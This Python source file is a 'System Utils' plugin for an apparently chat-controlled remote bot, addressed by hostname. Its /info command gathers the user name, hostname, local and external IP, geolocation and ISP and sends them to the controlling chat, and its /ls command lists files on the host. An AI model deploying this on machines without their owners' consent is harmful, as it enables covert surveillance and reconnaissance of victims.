from plugins import Plugin, Command

from threading import Thread

import os
import glob
import platform
import getpass
import requests
import socket


class Main(Plugin):

    name = 'System Utils'
    version = '1.0.0'
    
    def setup(self):
        
        c = Command('/ls', usage='HOSTNAME /ls [pattern] - lists current directory (cwd-like), if [pattern] is specified, simulates ls behaviour')
        self.add_command(c)

        c = Command('/info', usage='HOSTNAME /info - displays system info')
        self.add_command(c)

    def handle(self, command, chat_id, *args, **kwargs):
        if command == '/info':
            arg_list = [chat_id]
            arg_list += args

            t = Thread(target=self.handle_info, args=tuple(arg_list))
            t.start()
        elif command in ['/ls']:
            arg_list = [chat_id]

            if len(args) > 0:
                arg_list += args
            else:
                arg_list += [os.getcwd()]

            t = Thread(target=self.handle_ls, args=tuple(arg_list))
            t.start()

    def handle_info(self, chat_id):
        try:
            infos = []
            infos.append('[+] - System Infos - [+]')
            infos.append('User: {user}'.format(user=getpass.getuser()))
            infos.append('Current Folder: {cwd}'.format(cwd=os.getcwd()))
            infos.append('Plataform: {platform}'.format(platform=platform.platform()))
            if self.bot.platform == 'win32':
                infos.append('Processor: {processor}'.format(processor=platform.processor()))
            elif self.bot.platform == 'linux' or self.bot.platform == 'linux2':
                infos.append('Uname: {uname}'.format(uname=' '.join(platform.uname())))
            infos.append('Hostname: {hostname}'.format(hostname=platform.node()))
            infos.append('Local IP: {local_ip}'.format(local_ip=socket.gethostbyname(socket.gethostname())))

            infos.append('[+] - External IP Infos - [+]')
            r = requests.get('http://ip-api.com/json')
            result = r.json()

            infos.append('External IP: {query}'.format(**result))
            infos.append('City: {city}'.format(**result))
            infos.append('Region: {region}'.format(**result))
            infos.append('Region Name: {regionName}'.format(**result))
            infos.append('Latitude: {lat}'.format(**result))
            infos.append('Longitude: {lon}'.format(**result))
            infos.append('ISP: {isp}'.format(**result))
            return self.bot.send_message(chat_id, '\n'.join(infos))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))


    def handle_ls(self, chat_id, pattern):
        try:
            files = [name for name in glob.glob(pattern)]
            return self.bot.send_message(chat_id, '\n'.join(files))
        except Exception as e:
            return self.bot.send_message(chat_id, 'Error: {}'.format(str(e)))



